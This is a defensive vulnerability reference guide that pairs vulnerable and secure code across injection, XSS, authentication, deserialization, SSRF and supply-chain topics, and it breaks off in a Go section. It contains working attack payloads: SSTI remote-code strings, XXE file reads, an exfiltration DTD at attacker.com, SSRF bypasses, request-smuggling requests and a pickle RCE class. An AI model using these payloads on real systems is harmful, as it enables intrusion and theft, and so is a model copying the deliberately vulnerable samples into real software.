# Security Commons - Comprehensive Vulnerability Reference Guide

A complete reference for understanding security vulnerabilities detected by Vibeship Scanner and security best practices. This document covers common, uncommon, and rare vulnerabilities across all categories.

**Last Updated**: 2025-12-02

---

## Table of Contents

1. [OWASP Top 10 (2021)](#owasp-top-10-2021)
2. [CWE Top 25 (2024)](#cwe-top-25-2024)
3. [Injection Attacks](#injection-attacks)
4. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
5. [Authentication & Session Vulnerabilities](#authentication--session-vulnerabilities)
6. [Access Control Vulnerabilities](#access-control-vulnerabilities)
7. [Cryptographic Failures](#cryptographic-failures)
8. [Server-Side Vulnerabilities](#server-side-vulnerabilities)
9. [API Security Vulnerabilities](#api-security-vulnerabilities)
10. [Deserialization Vulnerabilities](#deserialization-vulnerabilities)
11. [File Handling Vulnerabilities](#file-handling-vulnerabilities)
12. [Client-Side Vulnerabilities](#client-side-vulnerabilities)
13. [Infrastructure & Cloud Vulnerabilities](#infrastructure--cloud-vulnerabilities)
14. [Supply Chain Vulnerabilities](#supply-chain-vulnerabilities)
15. [Language-Specific Vulnerabilities](#language-specific-vulnerabilities)
16. [Advanced & Rare Vulnerabilities](#advanced--rare-vulnerabilities)
17. [Detection Methods & Tools](#detection-methods--tools)

---

## OWASP Top 10 (2021)

The OWASP Top 10 represents the most critical security risks to web applications.

| Rank | Category | CWE Examples | SAST Detectable |
|------|----------|--------------|-----------------|
| A01 | Broken Access Control | CWE-22, CWE-601, CWE-639 | Partial |
| A02 | Cryptographic Failures | CWE-327, CWE-328, CWE-798 | Yes |
| A03 | Injection | CWE-78, CWE-79, CWE-89 | Yes |
| A04 | Insecure Design | Various | No (Design Review) |
| A05 | Security Misconfiguration | CWE-16, CWE-611 | Partial |
| A06 | Vulnerable Components | CWE-1035 | Yes (SCA) |
| A07 | Auth Failures | CWE-287, CWE-384 | Partial |
| A08 | Data Integrity Failures | CWE-502, CWE-829 | Yes |
| A09 | Logging Failures | CWE-778, CWE-532 | Partial |
| A10 | SSRF | CWE-918 | Yes |

---

## CWE Top 25 (2024)

The 2024 CWE Top 25 Most Dangerous Software Weaknesses, based on 31,770 CVE records.

| Rank | CWE ID | Name | Severity |
|------|--------|------|----------|
| 1 | CWE-79 | Cross-site Scripting (XSS) | High |
| 2 | CWE-787 | Out-of-bounds Write | Critical |
| 3 | CWE-89 | SQL Injection | Critical |
| 4 | CWE-352 | Cross-Site Request Forgery | High |
| 5 | CWE-22 | Path Traversal | High |
| 6 | CWE-125 | Out-of-bounds Read | Medium |
| 7 | CWE-78 | OS Command Injection | Critical |
| 8 | CWE-416 | Use After Free | Critical |
| 9 | CWE-862 | Missing Authorization | High |
| 10 | CWE-434 | Unrestricted File Upload | High |
| 11 | CWE-94 | Code Injection | Critical |
| 12 | CWE-20 | Improper Input Validation | High |
| 13 | CWE-77 | Command Injection | Critical |
| 14 | CWE-190 | Integer Overflow | High |
| 15 | CWE-502 | Deserialization of Untrusted Data | Critical |

---

## Injection Attacks

### SQL Injection (CWE-89)

**Risk Level**: Critical | **CVSS**: 9.8

**What it is**: Attacker injects malicious SQL code through user input to manipulate database queries.

**Vulnerable Code**:
```javascript
// JavaScript - String concatenation
const query = "SELECT * FROM users WHERE id = " + userId;
db.query(query);

// Template literal without parameterization
db.query(`SELECT * FROM users WHERE email = '${email}'`);
```

```python
# Python - String formatting
cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

```php
// PHP - Direct concatenation
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
mysqli_query($conn, $query);
```

```java
// Java - String concatenation
String query = "SELECT * FROM users WHERE id = " + userId;
statement.executeQuery(query);
```

**Secure Code**:
```javascript
// Parameterized query
db.query("SELECT * FROM users WHERE id = ?", [userId]);

// Using ORM (Prisma, Sequelize)
const user = await User.findOne({ where: { id: userId } });
```

```python
# Parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Using SQLAlchemy ORM
user = session.query(User).filter(User.id == user_id).first()
```

```php
// Prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

```java
// PreparedStatement
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
```

**Key Prevention Points**:
- Always use parameterized queries or prepared statements
- Use ORMs with proper escaping
- Validate and sanitize input as defense-in-depth
- Apply principle of least privilege to database accounts

---

### NoSQL Injection (CWE-943)

**Risk Level**: High | **CVSS**: 8.1

**What it is**: Exploiting NoSQL databases through malicious query operators.

**Vulnerable Code**:
```javascript
// MongoDB - Direct user input
db.users.findOne({
  username: req.body.username,
  password: req.body.password
});
// Attacker sends: { "password": { "$ne": "" } }
```

**Secure Code**:
```javascript
// Type coercion
const username = String(req.body.username);
const password = String(req.body.password);

// Using mongoose-sanitize
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize());

// Schema validation
const UserSchema = new Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }
});
```

---

### Command Injection (CWE-78)

**Risk Level**: Critical | **CVSS**: 9.8

**What it is**: Attacker executes arbitrary system commands through user input.

**Vulnerable Code**:
```javascript
// Node.js - exec with user input
const { exec } = require('child_process');
exec(`ping ${userInput}`);
exec(`git clone ${repoUrl}`);

// eval with user input
eval(userProvidedCode);
```

```python
# Python - os.system with user input
import os
os.system(f"ping {host}")
subprocess.call(f"ls {directory}", shell=True)
```

```php
// PHP - shell functions
shell_exec("ping " . $_GET['host']);
exec("cat " . $filename);
system("ls " . $dir);
passthru("grep " . $pattern);
```

**Secure Code**:
```javascript
// Use execFile with arguments array
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', validatedHost]);

// Whitelist allowed values
const allowedCommands = ['status', 'info'];
if (allowedCommands.includes(userInput)) {
  execFile(userInput);
}

// Use native libraries instead
const dns = require('dns');
dns.lookup(hostname, callback);
```

```python
# Use subprocess with list arguments
import subprocess
subprocess.run(['ping', '-c', '4', validated_host], shell=False)

# Use shlex for shell escaping if needed
import shlex
subprocess.run(shlex.split(f'echo {shlex.quote(user_input)}'))
```

---

### LDAP Injection (CWE-90)

**Risk Level**: High | **CVSS**: 8.1

**What it is**: Exploiting LDAP queries by injecting malicious characters.

**Vulnerable Code**:
```java
// Java - Direct string concatenation
String filter = "(&(USER=" + username + ")(PASSWORD=" + password + "))";
ctx.search("ou=users", filter, ctls);
```

**Attack Payloads**:
```
Username: *)(uid=*))(|(uid=*
Username: admin)(&)
Password: anything
```

**Secure Code**:
```java
// Escape special characters
String safeUsername = escapeLDAPSearchFilter(username);
String filter = "(&(USER=" + safeUsername + ")(PASSWORD=" + safePassword + "))";

// LDAP escaping function
public static String escapeLDAPSearchFilter(String filter) {
    StringBuilder sb = new StringBuilder();
    for (char c : filter.toCharArray()) {
        switch (c) {
            case '\\': sb.append("\\5c"); break;
            case '*': sb.append("\\2a"); break;
            case '(': sb.append("\\28"); break;
            case ')': sb.append("\\29"); break;
            case '\0': sb.append("\\00"); break;
            default: sb.append(c);
        }
    }
    return sb.toString();
}
```

---

### Template Injection - SSTI (CWE-1336)

**Risk Level**: Critical | **CVSS**: 9.8

**What it is**: Injecting malicious code into server-side templates leading to RCE.

**Detection Payloads**:
```
{{7*7}}           → 49 (Jinja2, Twig)
{{7*'7'}}         → 7777777 (Jinja2), 49 (Twig)
${7*7}            → 49 (Freemarker, Mako)
<%= 7*7 %>        → 49 (ERB)
#{7*7}            → 49 (Thymeleaf)
```

**Vulnerable Code**:
```python
# Jinja2 - User input in template
from jinja2 import Template
template = Template(user_input)  # DANGEROUS
template.render()
```

```php
// Twig - User input rendered
echo $twig->render($user_controlled_template);
```

**RCE Payloads**:
```python
# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}
```

```java
// Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

**Secure Code**:
```python
# Never render user input as template
# Use sandbox mode
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()

# Use logic-less templates (Mustache)
```

---

## Cross-Site Scripting (XSS)

### Reflected XSS (CWE-79)

**Risk Level**: High | **CVSS**: 6.1

**Vulnerable Code**:
```javascript
// DOM manipulation
element.innerHTML = userInput;
document.write(location.search);

// React dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userContent }} />
```

```php
// Direct echo
echo $_GET['search'];
echo "<div>" . $userInput . "</div>";
```

**Secure Code**:
```javascript
// Use textContent
element.textContent = userInput;

// React auto-escapes
<div>{userInput}</div>

// Sanitize if HTML needed
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

```php
// HTML encoding
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
```

### DOM-based XSS

**Vulnerable Sinks**:
```javascript
// Dangerous sinks
document.write()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout(string)
setInterval(string)
new Function(string)
location.href = userInput
location.assign(userInput)
```

**Dangerous Sources**:
```javascript
location.search
location.hash
location.href
document.URL
document.referrer
window.name
postMessage data
```

---

## Authentication & Session Vulnerabilities

### Hardcoded Credentials (CWE-798)

**Risk Level**: Critical | **CVSS**: 9.8

**Vulnerable Code**:
```javascript
const JWT_SECRET = "super-secret-key-123";
const API_KEY = "sk_live_abc123xyz";
const DB_PASSWORD = "admin123";
```

```python
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
DATABASE_URL = "postgresql://user:password@localhost/db"
```

**Secure Code**:
```javascript
// Environment variables
const JWT_SECRET = process.env.JWT_SECRET;

// Secrets manager
import { SecretsManager } from 'aws-sdk';
const secret = await secretsManager.getSecretValue({ SecretId: 'api-key' });
```

---

### JWT Vulnerabilities (CWE-347)

**Risk Level**: High | **CVSS**: 8.1

#### "None" Algorithm Bypass

**Vulnerable Code**:
```javascript
// Server trusts alg header from token
jwt.verify(token, secret);  // Doesn't enforce algorithm
```

**Attack**:
```javascript
// Original token header: {"alg": "HS256", "typ": "JWT"}
// Modified header: {"alg": "none", "typ": "JWT"}
// Remove signature from token
```

**Secure Code**:
```javascript
// Explicitly specify allowed algorithms
jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256']
});
```

#### Algorithm Confusion Attack

**Attack**: Server expects RS256 but attacker uses HS256 with public key as secret.

```javascript
// Attacker signs token with HS256 using the public RSA key
const publicKey = fs.readFileSync('public.pem');
jwt.sign(payload, publicKey, { algorithm: 'HS256' });
```

**Secure Code**:
```javascript
// Enforce expected algorithm
jwt.verify(token, publicKey, {
  algorithms: ['RS256']  // Only allow RS256
});
```

---

### OAuth 2.0 Vulnerabilities

**Risk Level**: High

#### Authorization Code Interception

**Vulnerability**: Without PKCE, authorization codes can be intercepted.

**Secure Implementation**:
```javascript
// Generate code verifier and challenge
const crypto = require('crypto');
const codeVerifier = crypto.randomBytes(32).toString('base64url');
const codeChallenge = crypto
  .createHash('sha256')
  .update(codeVerifier)
  .digest('base64url');

// Authorization request includes code_challenge
const authUrl = `${authServer}/authorize?
  response_type=code&
  client_id=${clientId}&
  code_challenge=${codeChallenge}&
  code_challenge_method=S256`;

// Token exchange includes code_verifier
const tokenResponse = await fetch(`${authServer}/token`, {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authCode,
    code_verifier: codeVerifier
  })
});
```

---

### Weak Password Storage (CWE-916)

**Vulnerable Code**:
```javascript
// Plaintext storage
user.password = password;

// MD5/SHA1 hashing
const hash = crypto.createHash('md5').update(password).digest('hex');
```

**Secure Code**:
```javascript
// bcrypt with proper cost factor
import bcrypt from 'bcrypt';
const hash = await bcrypt.hash(password, 12);
const match = await bcrypt.compare(password, storedHash);

// Argon2 (recommended)
import argon2 from 'argon2';
const hash = await argon2.hash(password);
const match = await argon2.verify(hash, password);
```

---

## Access Control Vulnerabilities

### Broken Object Level Authorization - BOLA/IDOR (CWE-639)

**Risk Level**: High | **CVSS**: 7.5

**What it is**: Accessing resources by manipulating object identifiers.

**Vulnerable Code**:
```javascript
// No authorization check
app.get('/api/users/:id/data', (req, res) => {
  const data = await User.findById(req.params.id);
  res.json(data);  // Anyone can access any user's data
});

// File download without auth check
app.get('/download', (req, res) => {
  res.sendFile(`/uploads/${req.query.filename}`);
});
```

**Secure Code**:
```javascript
// Verify ownership
app.get('/api/users/:id/data', requireAuth, (req, res) => {
  if (req.params.id !== req.user.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const data = await User.findById(req.params.id);
  res.json(data);
});

// Use indirect references
app.get('/api/documents/:index', requireAuth, (req, res) => {
  const userDocs = await Document.find({ owner: req.user.id });
  const doc = userDocs[parseInt(req.params.index)];
  if (!doc) return res.status(404).json({ error: 'Not found' });
  res.json(doc);
});
```

---

### Path Traversal (CWE-22)

**Risk Level**: High | **CVSS**: 7.5

**Vulnerable Code**:
```javascript
// User controls file path
const filePath = `/uploads/${req.query.filename}`;
fs.readFile(filePath);
// Attack: ?filename=../../../etc/passwd
```

```php
include($_GET['page'] . '.php');
// Attack: ?page=../../../etc/passwd%00
```

**Secure Code**:
```javascript
const path = require('path');
const uploadsDir = '/var/app/uploads';
const filename = path.basename(req.query.filename);
const filePath = path.join(uploadsDir, filename);

// Verify path is within allowed directory
if (!filePath.startsWith(uploadsDir)) {
  throw new Error('Invalid path');
}
```

```php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed)) {
    include($page . '.php');
}
```

---

## Cryptographic Failures

### Weak Cryptography (CWE-327)

**Risk Level**: Medium-High | **CVSS**: 7.5

**Weak Algorithms** (DO NOT USE):
- MD5 - Broken, collision attacks
- SHA1 - Deprecated, collision attacks
- DES - Key too short (56-bit)
- RC4 - Multiple vulnerabilities
- ECB mode - Pattern preservation

**Vulnerable Code**:
```javascript
// Weak hash
crypto.createHash('md5').update(data).digest('hex');
crypto.createHash('sha1').update(data).digest('hex');

// Weak encryption
crypto.createCipheriv('des', key, iv);
crypto.createCipheriv('aes-256-ecb', key, null);
```

**Secure Code**:
```javascript
// Strong hash (for non-passwords)
crypto.createHash('sha256').update(data).digest('hex');
crypto.createHash('sha3-256').update(data).digest('hex');

// Strong encryption with authenticated mode
crypto.createCipheriv('aes-256-gcm', key, iv);
crypto.createCipheriv('chacha20-poly1305', key, iv);

// For passwords, use bcrypt or Argon2
import bcrypt from 'bcrypt';
const hash = await bcrypt.hash(password, 12);
```

---

### TLS/SSL Issues (CWE-295)

**Risk Level**: High | **CVSS**: 7.4

**Vulnerable Code**:
```javascript
// Disabling certificate verification
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

https.request({ rejectUnauthorized: false });

// Python
requests.get(url, verify=False)

// Go
InsecureSkipVerify: true
```

**Secure Code**:
```javascript
// Always verify certificates
https.request({
  rejectUnauthorized: true,
  ca: fs.readFileSync('ca-cert.pem')
});
```

---

## Server-Side Vulnerabilities

### Server-Side Request Forgery - SSRF (CWE-918)

**Risk Level**: High | **CVSS**: 9.1

**What it is**: Making server perform requests to unintended locations.

**Vulnerable Code**:
```javascript
app.get('/fetch', async (req, res) => {
  const response = await fetch(req.query.url);
  res.send(await response.text());
});
```

```php
$data = file_get_contents($_GET['url']);
```

**Bypass Techniques**:
```
# Alternative IP representations for 127.0.0.1
http://127.1
http://0
http://0.0.0.0
http://[::]:80
http://2130706433        (decimal)
http://0x7f000001        (hex)
http://017700000001      (octal)

# DNS rebinding
http://attacker-controlled-domain.com  → resolves to 127.0.0.1

# Protocol variations
file:///etc/passwd
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:6379/_*1%0d%0a...
```

**Secure Code**:
```javascript
// Whitelist allowed domains
const allowedHosts = ['api.example.com', 'cdn.example.com'];
const url = new URL(req.query.url);

if (!allowedHosts.includes(url.hostname)) {
  return res.status(403).json({ error: 'Domain not allowed' });
}

// Block internal IPs
const ip = await dns.lookup(url.hostname);
if (isPrivateIP(ip)) {
  return res.status(403).json({ error: 'Internal IPs not allowed' });
}
```

---

### XML External Entity - XXE (CWE-611)

**Risk Level**: High | **CVSS**: 7.5

**What it is**: Exploiting XML parsers to read files or perform SSRF.

**Attack Payloads**:
```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>

<!-- Blind XXE with OOB exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

<!-- Billion laughs DoS -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
]>
```

**Vulnerable Code**:
```java
// Java - XXE enabled by default
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(xmlInput);
```

```python
# Python - lxml without secure settings
from lxml import etree
doc = etree.parse(xml_input)
```

**Secure Code**:
```java
// Disable external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```python
# Use defusedxml
from defusedxml import ElementTree
doc = ElementTree.parse(xml_input)
```

---

### HTTP Request Smuggling

**Risk Level**: High | **CVSS**: 8.1

**What it is**: Exploiting inconsistencies between front-end and back-end servers in parsing HTTP requests.

#### CL.TE Attack (Front-end uses Content-Length, back-end uses Transfer-Encoding)

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

#### TE.CL Attack (Front-end uses Transfer-Encoding, back-end uses Content-Length)

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

**Prevention**:
- Use HTTP/2 end-to-end
- Configure front-end to reject ambiguous requests
- Ensure both servers use same parsing rules

---

## API Security Vulnerabilities

### GraphQL Vulnerabilities

**Risk Level**: Medium-High

#### Introspection Information Disclosure

**Vulnerable**: Introspection enabled in production
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

#### Batching Attacks (DoS/Brute Force)

```graphql
# Brute force via batching
[
  { query: "mutation { login(user:\"admin\", pass:\"pass1\") }" },
  { query: "mutation { login(user:\"admin\", pass:\"pass2\") }" },
  { query: "mutation { login(user:\"admin\", pass:\"pass3\") }" }
  // ... hundreds more
]
```

#### Alias-based DoS

```graphql
{
  a1: expensiveQuery { data }
  a2: expensiveQuery { data }
  a3: expensiveQuery { data }
  # ... many more aliases
}
```

**Secure Configuration**:
```javascript
// Disable introspection in production
const server = new ApolloServer({
  introspection: process.env.NODE_ENV !== 'production',
  plugins: [
    ApolloServerPluginLandingPageDisabled(),
  ],
});

// Implement query complexity limits
// Implement rate limiting per operation
// Limit batch size
```

---

### CORS Misconfiguration

**Risk Level**: Medium-High | **CVSS**: 6.5

**Vulnerable Configurations**:
```javascript
// Reflecting origin without validation
app.use(cors({
  origin: req.headers.origin,  // DANGEROUS
  credentials: true
}));

// Trusting null origin
app.use(cors({
  origin: 'null',
  credentials: true
}));

// Trusting all subdomains (risky)
if (origin.endsWith('.example.com')) {
  // Attacker: evil.example.com
}
```

**Secure Configuration**:
```javascript
const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

---

## Deserialization Vulnerabilities

### Java Deserialization (CWE-502)

**Risk Level**: Critical | **CVSS**: 9.8

**What it is**: Executing arbitrary code through malicious serialized Java objects.

**Vulnerable Code**:
```java
ObjectInputStream ois = new ObjectInputStream(untrustedInput);
Object obj = ois.readObject();  // RCE possible
```

**Notable CVEs**:
- CVE-2015-7501 (Apache Commons Collections)
- CVE-2015-4852 (Oracle WebLogic)
- CVE-2016-0792 (Jenkins)

**Tools**: ysoserial generates exploitation payloads

**Secure Code**:
```java
// Use look-ahead deserialization
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.base/*;!*"
);
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);

// Better: Avoid Java serialization entirely
// Use JSON with strict schema validation
```

---

### Python Pickle Deserialization

**Risk Level**: Critical | **CVSS**: 9.8

**Vulnerable Code**:
```python
import pickle
data = pickle.loads(user_input)  # RCE via __reduce__
```

**Attack Payload**:
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
```

**Secure Code**:
```python
# Use JSON instead
import json
data = json.loads(user_input)

# If pickle required, use restricted unpickler
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        raise pickle.UnpicklingError("Forbidden")
```

---

### PHP Deserialization

**Risk Level**: High | **CVSS**: 8.1

**Vulnerable Code**:
```php
$data = unserialize($_GET['data']);  // Magic methods executed
```

**Attack**: Exploiting __wakeup(), __destruct(), __toString() magic methods

**Secure Code**:
```php
// Use JSON
$data = json_decode($_GET['data'], true);

// If unserialize required, use allowed_classes
$data = unserialize($input, ['allowed_classes' => false]);
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]);
```

---

### Ruby Marshal/YAML Deserialization

**Risk Level**: Critical | **CVSS**: 9.8

**Vulnerable Code**:
```ruby
# Unsafe YAML loading
data = YAML.load(user_input)

# Unsafe Marshal
data = Marshal.load(user_input)
```

**Secure Code**:
```ruby
# Safe YAML loading
data = YAML.safe_load(user_input)
data = YAML.safe_load(user_input, permitted_classes: [Symbol, Date])

# Use JSON instead of Marshal
data = JSON.parse(user_input)
```

---

## File Handling Vulnerabilities

### Unrestricted File Upload (CWE-434)

**Risk Level**: Critical | **CVSS**: 9.8

**Vulnerable Code**:
```javascript
// No validation
app.post('/upload', upload.single('file'), (req, res) => {
  // Accepts any file
});
```

**Attack Vectors**:
- Upload .php, .jsp, .aspx for RCE
- Upload .html/.svg for XSS
- Upload .htaccess to modify server config

**Secure Code**:
```javascript
const allowedMimes = ['image/jpeg', 'image/png', 'application/pdf'];
const allowedExts = ['.jpg', '.jpeg', '.png', '.pdf'];

const fileFilter = (req, file, cb) => {
  const ext = path.extname(file.originalname).toLowerCase();

  if (allowedMimes.includes(file.mimetype) && allowedExts.includes(ext)) {
    cb(null, true);
  } else {
    cb(new Error('Invalid file type'), false);
  }
};

// Verify magic bytes
import fileType from 'file-type';
const type = await fileType.fromBuffer(buffer);
if (!allowedMimes.includes(type?.mime)) {
  throw new Error('Invalid file');
}

// Store outside webroot with random names
const filename = crypto.randomUUID() + '.jpg';
const uploadPath = path.join('/var/uploads', filename);
```

---

## Client-Side Vulnerabilities

### Prototype Pollution

**Risk Level**: High | **CVSS**: 7.5

**What it is**: Modifying JavaScript Object prototype to affect all objects.

**Vulnerable Code**:
```javascript
// Deep merge without protection
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attack payload
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
// Now all objects have isAdmin = true
```

**Notable CVEs**:
- CVE-2018-16487 (Lodash)
- CVE-2024-21529 (dset)
- CVE-2023-26113 (collection.js)

**Secure Code**:
```javascript
// Use Object.create(null)
const obj = Object.create(null);

// Use Map instead of Object
const map = new Map();

// Freeze prototype
Object.freeze(Object.prototype);

// Validate keys
function safeMerge(target, source) {
  for (let key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    // ... merge logic
  }
}
```

---

### Clickjacking (CWE-1021)

**Risk Level**: Medium | **CVSS**: 6.1

**What it is**: Tricking users into clicking hidden elements via transparent iframes.

**Prevention Headers**:
```http
# X-Frame-Options (legacy)
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN

# Content-Security-Policy (recommended)
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
Content-Security-Policy: frame-ancestors https://trusted.com;
```

**Server Configuration**:
```javascript
// Express.js
app.use(helmet({
  frameguard: { action: 'deny' }
}));

// Or with CSP
app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'none'"]
  }
}));
```

---

### Open Redirect (CWE-601)

**Risk Level**: Medium | **CVSS**: 6.1

**Vulnerable Code**:
```javascript
res.redirect(req.query.returnUrl);
// Attack: ?returnUrl=https://evil.com
```

**Secure Code**:
```javascript
// Whitelist allowed domains
const allowedHosts = ['example.com', 'app.example.com'];
const url = new URL(req.query.returnUrl, 'https://example.com');

if (allowedHosts.includes(url.host)) {
  res.redirect(url.toString());
} else {
  res.redirect('/');
}

// Only allow relative paths
const returnPath = req.query.returnUrl;
if (returnPath.startsWith('/') && !returnPath.startsWith('//')) {
  res.redirect(returnPath);
} else {
  res.redirect('/');
}
```

---

### WebSocket Hijacking (CSWSH)

**Risk Level**: High | **CVSS**: 8.1

**What it is**: CSRF-like attack on WebSocket connections.

**Vulnerable Code**:
```javascript
// Server doesn't validate Origin
wss.on('connection', (ws, req) => {
  // No origin check
});
```

**Secure Code**:
```javascript
wss.on('connection', (ws, req) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://example.com'];

  if (!allowedOrigins.includes(origin)) {
    ws.close(1008, 'Origin not allowed');
    return;
  }

  // Additional CSRF token validation
  const token = req.headers['sec-websocket-protocol'];
  if (!validateCSRFToken(token, req.session)) {
    ws.close(1008, 'Invalid token');
    return;
  }
});
```

---

## Infrastructure & Cloud Vulnerabilities

### Kubernetes Security Issues

#### RBAC Misconfigurations

**Vulnerable**:
```yaml
# Overly permissive ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: admin-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

**Secure**:
```yaml
# Least privilege
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: app-namespace
  name: app-role
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
```

#### Secrets Management

**Vulnerable**: Secrets stored unencrypted in etcd

**Secure**:
```yaml
# Enable encryption at rest
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded-secret>
```

---

### Subdomain Takeover

**Risk Level**: Medium | **CVSS**: 7.5

**What it is**: Claiming abandoned cloud resources pointed to by DNS records.

**Vulnerable Services**:
- AWS S3 buckets
- Azure Blob Storage
- GitHub Pages
- Heroku apps
- Shopify stores

**Detection**:
```bash
# Check for dangling CNAMEs
dig CNAME subdomain.example.com

# Look for error messages like:
# "There isn't a GitHub Pages site here"
# "NoSuchBucket"
# "No such app"
```

**Prevention**:
- Remove DNS records before decommissioning services
- Regularly audit DNS records
- Use DNS monitoring for dangling records

---

## Supply Chain Vulnerabilities

### Dependency Confusion

**Risk Level**: Critical | **CVSS**: 9.8

**What it is**: Tricking package managers into installing malicious packages from public registries.

**Attack Vector**:
1. Find internal package names (from build configs, error messages)
2. Create malicious package with same name on public npm/PyPI
3. Package manager installs public version (higher version number)

**Prevention**:
```bash
# .npmrc - Scope packages to private registry
@company:registry=https://private.registry.com/

# Use package-lock.json and verify integrity
npm ci

# Pin versions exactly
"dependencies": {
  "package": "1.2.3"
}
```

### npm Supply Chain Attacks (2025)

**Recent Attack (September 2025)**: Compromise of 18 packages including chalk, debug, ansi-styles affecting 2.6 billion weekly downloads.

**Prevention**:
- Enable 2FA on npm accounts
- Use lockfiles with integrity hashes
- Implement SLSA framework
- Monitor for suspicious package updates

---

## Language-Specific Vulnerabilities

### PHP Type Juggling

**Risk Level**: High | **CVSS**: 7.5

**What it is**: Exploiting loose comparison (==) behavior.

**Vulnerable Code**:
```php
// Loose comparison bypasses
if ($password == $stored_hash) { }  // VULNERABLE
if (0 == "password") { }  // TRUE - string converts to 0

// Magic hashes (0e prefix treated as 0)
// MD5("240610708") = 0e462097431906509019562988736854
// MD5("QNKCDZO") = 0e830400451993494058024219903391
if (md5($input) == "0") { }  // Can be bypassed
```

**Secure Code**:
```php
// Strict comparison
if ($password === $stored_hash) { }

// hash_equals for timing-safe comparison
if (hash_equals($stored_hash, $computed_hash)) { }

// password_verify for passwords
if (password_verify($password, $hash)) { }

// in_array with strict mode
if (in_array($value, $array, true)) { }
```

---

### Ruby Dangerous Methods

**Risk Level**: Critical

**Vulnerable Code**:
```ruby
# constantize - RCE risk
params[:class].constantize.new

# send with user input
object.send(params[:method], params[:args])

# eval
eval(user_input)
```

**Secure Code**:
```ruby
# Whitelist allowed classes
ALLOWED_CLASSES = ['User', 'Post'].freeze
if ALLOWED_CLASSES.include?(params[:class])
  params[:class].constantize.new
end

# Whitelist allowed methods
ALLOWED_METHODS = [:to_s, :to_i].freeze
if ALLOWED_METHODS.include?(params[:method].to_sym)
  object.send(params[:method])
end
```

---

### Go Security Issues

**TLS Verification Disabled**:
```go
// VULNERABLE
